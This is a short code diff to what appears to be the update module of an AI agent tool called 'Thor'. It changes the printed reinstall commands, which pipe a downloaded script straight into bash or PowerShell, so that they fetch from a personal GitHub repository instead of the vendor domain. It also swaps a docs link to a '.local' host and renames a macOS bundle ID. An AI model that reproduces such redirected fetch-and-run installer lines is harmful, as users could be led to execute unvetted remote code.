@@ -36,8 +36,8 @@ _PRE_UPDATE_SNAPSHOT_MAX_FILE_SIZE = 1 << 30  # 1 GiB
 #: Reinstalling through the official installer swaps in a Python whose SQLite is safe; the
 #: one-liner differs per OS (mirrors ``uninstall._REINSTALL_HINT``). windows -> command
 _REINSTALL_ONE_LINER = {
-    True: "iex (irm https://thor-agent.nousresearch.com/install.ps1)",
-    False: "curl -fsSL https://thor-agent.nousresearch.com/install.sh | bash",
+    True: "iex (irm https://raw.githubusercontent.com/dwisetyabudi15581/Thor-agent/main/scripts/install.ps1)",
+    False: "curl -fsSL https://raw.githubusercontent.com/dwisetyabudi15581/Thor-agent/main/scripts/install.sh | bash",
 }
 
 
@@ -102,7 +102,7 @@ def _print_curator_first_run_notice() -> None:
     )
     print("  Preview now:  thor curator run --dry-run")
     print("  Pause it:     thor curator pause")
-    print("  Docs:         https://thor-agent.nousresearch.com/docs/user-guide/features/curator")
+    print("  Docs:         https://thor-agent.thor-agent.local/docs/user-guide/features/curator")
 
 
 def _print_fts_optimize_available_notice() -> None:
@@ -1003,7 +1003,7 @@ def _run_post_update_maintenance(
         print(
             "  ℹ macOS: if Thor re-prompts for permissions you already "
             "granted (toggle shows ON), the stored grant is stale — run "
-            "`tccutil reset ScreenCapture com.nousresearch.thor` (repeat "
+            "`tccutil reset ScreenCapture com.thorresearch.thor` (repeat "
             "per affected service), toggle it ON in System Settings, then "
             "fully quit & relaunch once."
         )
